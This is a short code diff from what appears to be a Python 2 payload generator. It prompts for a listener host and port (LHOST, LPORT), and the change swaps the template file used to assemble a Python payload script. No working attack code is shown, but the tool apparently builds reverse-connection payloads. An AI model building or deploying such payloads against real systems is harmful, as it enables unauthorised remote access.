@@ -42,7 +42,7 @@ def begin():
     host = raw_input('Type LHOST: ')
     port = raw_input('Type LPORT: ')
 
-    template = open('Templates/insane_enc.py', 'r')
+    template = open('Templates/Insane.py', 'r')
     o = template.read()
 
     payload = '#!/usr/bin/python\n'
